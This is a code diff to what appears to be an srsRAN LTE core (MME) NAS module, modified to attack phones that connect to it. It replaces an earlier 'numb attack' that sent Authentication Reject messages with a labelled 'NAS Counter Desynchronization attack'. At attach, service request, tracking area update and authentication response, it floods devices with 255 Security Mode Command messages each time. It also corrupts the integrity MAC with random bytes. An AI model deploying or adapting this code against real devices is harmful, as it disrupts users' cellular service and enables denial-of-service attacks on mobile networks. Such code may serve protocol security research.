@@ -80,7 +80,6 @@ bool nas::handle_attach_request(uint32_t                enb_ue_s1ap_id,
                                 const nas_init_t&       args,
                                 const nas_if_t&         itf)
 {
-  // ============================ !!!numb attack!!! =========================
     uint32_t                                       m_tmsi      = 0;
     uint64_t                                       imsi        = 0;
     LIBLTE_MME_ATTACH_REQUEST_MSG_STRUCT           attach_req  = {};
@@ -294,12 +293,14 @@ bool nas::handle_imsi_attach_request_unknown_ue(uint32_t                        
     return false;
   }
 
-  // ===================== !!! numb attack !!! ==========================
-  nas_ctx->pack_authentication_reject(nas_tx.get());
+  // ===================== !!! NAS Counter Desynchronization attack !!! ==========================
+  for (int i = 0; i < 255; ++i) {
+    nas_ctx->pack_security_mode_command(nas_tx.get());
+    // Send reply to eNB
+    s1ap->send_downlink_nas_transport(
+        nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
+  }
 
-  // Send reply to eNB
-  s1ap->send_downlink_nas_transport(
-      nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
 
   nas_logger.info("Downlink NAS: Sending Authentication Request");
   srsran::console("Downlink NAS: Sending Authentication Request\n");
@@ -408,10 +409,13 @@ bool nas::handle_guti_attach_request_unknown_ue(uint32_t                        
     srslog::fetch_basic_logger("NAS").error("Couldn't allocate PDU in %s().", __FUNCTION__);
     return false;
   }
-  // =================================== !!! numb attack !!! =======================================
-  nas_ctx->pack_authentication_reject(nas_tx.get());
-  s1ap->send_downlink_nas_transport(
-      nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
+  // =================================== !!! NAS Counter Desynchronization attack !!! =======================================
+  for (int i = 0; i < 255; ++i) {
+    nas_ctx->pack_security_mode_command(nas_tx.get());
+    s1ap->send_downlink_nas_transport(
+        nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), nas_ctx->m_ecm_ctx.enb_sri);
+  }
+
 
   return true;
 }
@@ -492,9 +496,12 @@ bool nas::handle_guti_attach_request_known_ue(nas*                              
     if (ecm_ctx->eit) {
       srsran::console("Secure ESM information transfer requested.\n");
       nas_logger.info("Secure ESM information transfer requested.");
-      // ====================== !!! numb attack !!! ==========================
-      nas_ctx->pack_authentication_reject(nas_tx.get());
-      s1ap->send_downlink_nas_transport(ecm_ctx->enb_ue_s1ap_id, ecm_ctx->mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+      // ====================== !!! NAS Counter Desynchronization attack !!! ==========================
+      for (int i = 0; i < 255; ++i) {
+        nas_ctx->pack_security_mode_command(nas_tx.get());
+        s1ap->send_downlink_nas_transport(ecm_ctx->enb_ue_s1ap_id, ecm_ctx->mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+      }
+
     } else {
       // Get subscriber info from HSS
       uint8_t default_bearer = 5;
@@ -567,11 +574,12 @@ bool nas::handle_guti_attach_request_known_ue(nas*                              
       nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    // ====================== !!! numb attack !!! ==========================
-    nas_ctx->pack_authentication_reject(nas_tx.get());
-
-    // Send reply to eNB
-    s1ap->send_downlink_nas_transport(ecm_ctx->enb_ue_s1ap_id, ecm_ctx->mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+    // ====================== !!! NAS Counter Desynchronization attack !!! ==========================
+    for (int i = 0; i < 255; ++i) {
+      nas_ctx->pack_security_mode_command(nas_tx.get());
+      // Send reply to eNB
+      s1ap->send_downlink_nas_transport(ecm_ctx->enb_ue_s1ap_id, ecm_ctx->mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+    }
     nas_logger.info("Downlink NAS: Sent Authentication Request");
     srsran::console("Downlink NAS: Sent Authentication Request\n");
     return true;
@@ -621,9 +629,12 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
       nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    // ====================== !!! numb attack !!! ==========================
-    nas_tmp.pack_authentication_reject(nas_tx.get());
-    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+    // ====================== !!! NAS Counter Desynchronization attack !!! ==========================
+    for (int i = 0; i < 255; ++i) {
+      nas_tmp.pack_security_mode_command(nas_tx.get());
+      s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+    }
+
     return true;
   }
 
@@ -640,9 +651,12 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
       nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    // ====================== !!! numb attack !!! ==========================
-    nas_tmp.pack_authentication_reject(nas_tx.get());
-    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+    // ====================== !!! NAS Counter Desynchronization attack !!! ==========================
+    for (int i = 0; i < 255; ++i) {
+      nas_tmp.pack_security_mode_command(nas_tx.get());
+      s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+    }
+
     return true;
   }
   emm_ctx_t* emm_ctx = &nas_ctx->m_emm_ctx;
@@ -858,9 +872,12 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
     nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
     return false;
   }
-  // ====================== !!! numb attack !!! ==========================
-  nas_tmp.pack_authentication_reject(nas_tx.get());
-  s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+  // ====================== !!! NAS Counter Desynchronization attack !!! ==========================
+  for (int i = 0; i < 255; ++i) {
+    nas_tmp.pack_security_mode_command(nas_tx.get());
+    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+  }
+
   return true;
 }
 
@@ -966,12 +983,13 @@ bool nas::handle_attach_request(srsran::byte_buffer_t* nas_rx)
       m_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
       return false;
     }
-    // ====================== !!! numb attack !!! ==========================
-    pack_authentication_reject(nas_tx.get());
-
-    // Send reply to eNB
-    m_s1ap->send_downlink_nas_transport(
-        m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
+    // ====================== !!! NAS Counter Desynchronization attack !!! ==========================
+    for (int i = 0; i < 255; ++i) {
+      pack_security_mode_command(nas_tx.get());
+      // Send reply to eNB
+      m_s1ap->send_downlink_nas_transport(
+          m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
+    }
 
     m_logger.info("DL NAS: Sending Authentication Request");
     srsran::console("DL NAS: Sending Authentication Request\n");
@@ -1058,31 +1076,20 @@ bool nas::handle_authentication_response(srsran::byte_buffer_t* nas_rx)
     srsran::console("UE Authentication Rejected.\n");
     m_logger.warning("UE Authentication Rejected.");
 
-    // Send back Athentication Reject
-    pack_authentication_reject(nas_tx.get());
     m_logger.info("Downlink NAS: Sending Authentication Reject.");
-  } else {
-    // Authentication accepted
-    //    srsran::console("UE Authentication Accepted.\n");
-    //    m_logger.info("UE Authentication Accepted.");
 
-    // Send Security Mode Command
-    //    m_sec_ctx.ul_nas_count = 0; // Reset the NAS uplink counter for the right key k_enb derivation
-    //    pack_security_mode_command(nas_tx.get());
-    //    srsran::console("Downlink NAS: Sending NAS Security Mode Command.\n");
-
-    // Authentication rejected to conduct numb attack
     srsran::console("UE Authentication Rejected.\n");
     m_logger.warning("UE Authentication Rejected.");
 
     // Send back Athentication Reject
-    pack_authentication_reject(nas_tx.get());
     m_logger.info("Downlink NAS: Sending Authentication Reject.");
   }
-
-  // Send reply
-  m_s1ap->send_downlink_nas_transport(
-      m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
+  for (int i = 0; i < 255; ++i) {
+    pack_security_mode_command(nas_tx.get());
+    // Send reply
+    m_s1ap->send_downlink_nas_transport(
+        m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), m_ecm_ctx.enb_sri);
+  }
   return true;
 }
 
@@ -1479,6 +1486,9 @@ bool nas::pack_security_mode_command(srsran::byte_buffer_t* nas_buffer)
   // Generate MAC for integrity protection
   uint8_t mac[4];
   integrity_generate(nas_buffer, mac);
+  for (int i = 0; i < 4; i++) {
+    mac[i] = random();
+  }
   memcpy(&nas_buffer->msg[1], mac, 4);
   return true;
 }
